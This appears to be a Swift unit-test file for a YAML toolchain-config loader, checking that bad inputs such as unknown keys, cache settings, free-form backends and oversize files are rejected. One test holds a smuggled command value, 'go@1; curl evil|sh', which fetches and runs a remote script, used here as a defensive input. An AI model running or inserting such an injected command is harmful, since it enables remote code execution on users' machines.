import XCTest

@testable import KinhinKit

final class ProjectFileLoaderTests: XCTestCase {
    private func parse(_ yaml: String) throws -> KinhinConfig.ToolchainsConfig? {
        try ProjectFileLoader.parse(Data(yaml.utf8))
    }

    func testParsesSpecsAndStacks() throws {
        let toolchains = try parse(
            """
            toolchains:
              specs: [go@1.22.5, node@22]
              stacks: [vercel]
            """)
        XCTAssertEqual(toolchains?.specs, ["go@1.22.5", "node@22"])
        XCTAssertEqual(toolchains?.stacks, ["vercel"])
    }

    func testEmptyFileAndEmptyToolchainsMeanNothingDeclared() throws {
        XCTAssertNil(try parse(""))
        XCTAssertNil(try parse("toolchains: {}"))
    }

    func testUnknownTopLevelKeyIsRejected() {
        XCTAssertThrowsError(try parse("provision_script: /tmp/x.sh\n"))
    }

    func testRepoFileCannotSetBrewCacheOrShareCache() {
        for body in ["brew: [wget]", "share_cache: true", "cache: {max_gb: 1}"] {
            XCTAssertThrowsError(try parse("toolchains:\n  \(body)\n"), body)
        }
    }

    func testFreeFormBackendsAreRejected() {
        XCTAssertThrowsError(try parse("toolchains:\n  specs: [\"ubi:owner/repo@1\"]\n"))
        XCTAssertThrowsError(try parse("toolchains:\n  specs: [\"npm:left-pad\"]\n"))
    }

    func testShellMetacharactersAreRejected() {
        XCTAssertThrowsError(try parse("toolchains:\n  specs: [\"go@1; curl evil|sh\"]\n"))
    }

    func testOversizeFileIsRejected() {
        let big = Data(repeating: UInt8(ascii: "#"), count: ProjectFileLoader.maxBytes + 1)
        XCTAssertThrowsError(try ProjectFileLoader.parse(big))
    }

    func testMalformedYAMLIsRejected() {
        XCTAssertThrowsError(try parse("toolchains: [unterminated"))
    }
}
